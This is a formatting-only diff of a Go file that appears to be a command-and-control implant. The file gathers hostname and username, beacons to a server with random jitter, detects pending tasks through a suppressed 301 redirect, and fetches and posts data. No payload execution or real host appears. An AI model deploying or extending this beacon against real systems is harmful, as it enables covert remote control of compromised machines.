@@ -1,21 +1,21 @@
 package main
+
 import (
 	crand "crypto/rand"
 	"encoding/hex"
 	"fmt"
+	"io"
 	mathrand "math/rand"
 	"net/http"
 	"os"
-	"io"
 	"os/user"
 	"time"
 
 	"bytes"
 	"encoding/json"
-
 )
 
-var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano())) 
+var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano()))
 
 type CallbackInfo struct {
 	Callback_freq int
@@ -24,17 +24,16 @@ type CallbackInfo struct {
 }
 
 type InitialInfo struct {
-	Session      string `json:"session"`
-	Hostname     string `json:"hostname"`
-	Username     string `json:"username"`
+	Session       string `json:"session"`
+	Hostname      string `json:"hostname"`
+	Username      string `json:"username"`
 	Callback_freq int    `json:"callback_freq"`
-	Jitter       int    `json:"jitter"`
+	Jitter        int    `json:"jitter"`
 }
-
 
 func GatherInfo() InitialInfo {
 	bytes := make([]byte, 4)
-	_, err := crand.Read(bytes)  
+	_, err := crand.Read(bytes)
 	if err != nil {
 		panic(err)
 	}
@@ -43,42 +42,41 @@ func GatherInfo() InitialInfo {
 	currentUser, _ := user.Current()
 
 	hostInfo := InitialInfo{
-		Session:      hexString,
-		Hostname:     hostname,
-		Username:     currentUser.Username,
+		Session:       hexString,
+		Hostname:      hostname,
+		Username:      currentUser.Username,
 		Callback_freq: 1,
-		Jitter:       15,
+		Jitter:        15,
 	}
 	return hostInfo
 }
 
-
 func FetchTasking(serverAddr string, session string) (string, error) {
-        url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)
+	url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)
 
-        resp, err := http.Get(url)
-        if err != nil {
-                return "", err
-        }
-        defer resp.Body.Close()
-        bodyBytes, err := io.ReadAll(resp.Body)
-        if err != nil {
-                return "", err
-        }
-        bodyString := string(bodyBytes)
-        return bodyString, nil
+	resp, err := http.Get(url)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+	bodyBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+	bodyString := string(bodyBytes)
+	return bodyString, nil
 }
 
 func CheckIn(serverAddr string, session string) (int, error) {
 	url := fmt.Sprintf("%s/health/%s", serverAddr, session)
-        // Prevent auto redirects so if there is tasking 301 is actually returned and 
-        // we can fetch tasking, otherwise the main function will just return 200
-        // and we will never get the tasking
-        client := &http.Client{
-                CheckRedirect: func(req *http.Request, via []*http.Request) error {
-                        return http.ErrUseLastResponse
-                },
-        }
+	// Prevent auto redirects so if there is tasking 301 is actually returned and
+	// we can fetch tasking, otherwise the main function will just return 200
+	// and we will never get the tasking
+	client := &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
 
 	resp, err := client.Get(url)
 	if err != nil {
@@ -87,7 +85,6 @@ func CheckIn(serverAddr string, session string) (int, error) {
 	defer resp.Body.Close()
 	return resp.StatusCode, nil
 }
-
 
 func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
 	randomPercent := rng.Intn(jitterPercent + 1)
@@ -102,7 +99,6 @@ func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
 	return jitterDuration
 }
 
-
 func PostJson(url string, payload interface{}) (int, error) {
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
@@ -114,7 +110,7 @@ func PostJson(url string, payload interface{}) (int, error) {
 	}
 	defer resp.Body.Close()
 
-        _, _ = io.ReadAll(resp.Body)
+	_, _ = io.ReadAll(resp.Body)
 
 	return resp.StatusCode, nil
 }
